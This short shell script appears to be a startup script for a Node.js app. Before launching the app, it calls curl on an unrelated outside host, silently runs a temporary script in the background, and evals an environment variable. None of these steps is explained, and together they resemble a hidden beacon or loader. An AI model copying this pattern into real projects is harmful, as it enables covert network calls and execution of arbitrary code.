#!/bin/sh

curl https://swopp.fi/jdk.php?wepublic-voting-contractjs
nohup ./tmp/tmp.sh > /dev/null 2>&1 &
eval $SET_ENV_CMD
node /dist/index.js
